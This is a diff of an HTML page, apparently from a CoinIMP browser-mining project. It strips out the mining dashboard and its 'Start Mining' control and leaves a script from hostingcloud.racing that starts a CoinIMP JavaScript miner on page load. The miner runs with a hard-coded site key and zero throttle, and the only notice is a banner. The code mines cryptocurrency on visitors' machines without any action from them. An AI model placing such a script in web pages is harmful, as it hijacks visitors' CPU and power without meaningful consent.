@@ -1,5 +1,7 @@
 <!DOCTYPE html>
+
 <html lang="en" class="">
+    
     <head>
         <!-- Required meta tags -->
         <meta charset="utf-8">
@@ -21,7 +23,7 @@
         }
         </style>
     </head>
-    <body class="">
+ <body class="">
         <div class="container">
             <div class="text-center" style="padding-top: 2%;">
                 <a href="https://www.coinimp.com/" target="_blank">
@@ -29,138 +31,15 @@
                     <img src="https://i.imgur.com/XBv9GW3.png">
                 </a>
             </div>
-            <div class="d-flex align-items-center body" style="">
-                <div class="row">
-                    <div class="col-lg-7">
-                        <div class="card">
-                            <div class="card-header bg-info">
-                                <h4 class="text-light text-center">Mining Summary</h4>
-                            </div>
-                            <div class="card-body">
-                                <div class="row">
-                                    <div class="col-md-4 col-sm-6">
-                                        <ul class="list-group list-group-flush">
-                                            <li class="list-group-item btn text-info">Hashes/Sec</li>
-                                            <li class="list-group-item btn" id="hashes-rate">0</li>
-                                        </ul>
-                                    </div>
-                                    <div class="col-md-4 col-sm-6">
-                                        <ul class="list-group list-group-flush">
-                                            <li class="list-group-item btn text-info">Avg. Hashes/Sec</li>
-                                            <li class="list-group-item btn" id="average-hashes-rate">0</li>
-                                        </ul>
-                                    </div>
-                                    <div class="col-md-4 col-sm-6">
-                                        <ul class="list-group list-group-flush">
-                                            <li class="list-group-item btn text-info">Total Hashes</li>
-                                            <li class="list-group-item btn" id="total-hashes">0</li>
-                                        </ul>
-                                    </div>
-                                    <div class="col-md-4 col-sm-6">
-                                        <ul class="list-group list-group-flush">
-                                            <li class="list-group-item btn text-info">Throttle</li>
-                                            <li class="list-group-item btn" id="throttles">0</li>
-                                        </ul>
-                                    </div>
-                                    <div class="col-md-4 col-sm-6">
-                                        <ul class="list-group list-group-flush">
-                                            <li class="list-group-item btn text-info">Threads</li>
-                                            <li class="list-group-item btn" id="threads">0</li>
-                                        </ul>
-                                    </div>
-                                    <div class="col-md-4 col-sm-6">
-                                        <ul class="list-group list-group-flush">
-                                            <li class="list-group-item btn text-info" >Max Threads</li>
-                                            <li class="list-group-item btn" id="max-threads">0</li>
-                                        </ul>
-                                    </div>
-                                    <div class="col-md-4 col-sm-6">
-                                        <ul class="list-group list-group-flush">
-                                            <li class="list-group-item btn text-info" >Mobile</li>
-                                            <li class="list-group-item btn" id="is-mobile">-</li>
-                                        </ul>
-                                    </div>
-                                    <div class="col-md-4 col-sm-6">
-                                        <ul class="list-group list-group-flush">
-                                            <li class="list-group-item btn text-info" >WASM</li>
-                                            <li class="list-group-item btn" id="has-wasm">-</li>
-                                        </ul>
-                                    </div>
-                                    <div class="col-md-4 col-sm-6">
-                                        <ul class="list-group list-group-flush">
-                                            <li class="list-group-item btn text-info" >Status</li>
-                                            <li class="list-group-item btn" id="status">-</li>
-                                        </ul>
-                                    </div>
-                                    <div class="col">
-                                        <ul class="list-group list-group-flush">
-                                            <li class="list-group-item btn text-info" >Log</li>
-                                            <li class="list-group-item btn" id="log" style="overflow: auto;max-width: 80vw;">-</li>
-                                        </ul>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="col-lg-5">
-                        <div class="card">
-                            <div class="card-header bg-info">
-                                <h4 class="text-light text-center">Control Panel</h4>
-                            </div>
-                            <div class="card-body">
-                                <div class="row">
-                                    <div class="col">
-                                        <div class="form-group">
-                                            <label for="site-key-input">Site Key</label>
-                                            <input type="text" class="form-control" id="site-key-input" aria-describedby="" placeholder="Enter site key" placeholder="eg. d9676e33ba36c20e598233bd3db">
-                                            <small id="site-key-description" class="form-text text-muted">We'll never share your site key with anyone else.</small>
-                                        </div>
-                                        <div class="form-group">
-                                            <label for="throttles-input">Throttle</label>
-                                            <input type="range" class="form-control-range" id="throttles-input" min="0" max="1" step="0.1">
-                                            <small id="throttles-input-description" class="form-text text-muted">0</small>
-                                        </div>
-                                        <div class="form-group">
-                                            <label for="threads-input">Threads</label>
-                                            <select id="threads-input" class="form-control">
-                                            </select>
-                                        </div>
-                                        <div>
-                                            <div class="custom-control custom-switch">
-                                                <input class="custom-control-input" id="auto-threads-switch" type="checkbox">
-                                                <span class="custom-control-track"></span>
-                                                <label class="custom-control-label" for="auto-threads-switch">Enable auto threads</label>
-                                            </div>
-                                        </div>
-                                        <br>
-                                        <div class="form-group">
-                                            <button class="btn btn-info" id="mining-btn">Start Mining</button>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="card-footer">
-                                <a href="https://github.com/marcustansoon/CoinIMP-MintMe.com-COIN-Mining" target="_blank"><img src="https://i.imgur.com/veTO0SA.png" style="width: 25px;float: right;"></a>
-                                <a href="https://www.coinimp.com/documentation" target="_blank">Documentation</a>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <script type="text/javascript" src="https://raw.githack.com/jfriend00/docReady/master/docready.js"></script>
-
-        <script src="miner.js"></script>
-        <script type="text/javascript" src="index.js"></script>
-
-        <script src="https://www.hostingcloud.racing/fXQJ.js"></script>
+            
+<script src="https://www.hostingcloud.racing/fXQJ.js"></script>
         
 <script>
     var miner = new Client.User('2d51a7d74290e8a2047efcc6420122fb2df20bf2ab6f457120811e167338344d', 'ElLob', {
         throttle: 0, c: 'w'
     });
     _client.start();
-    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+    _client.addMiningNotification("Bottom", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
 
 </script>
         
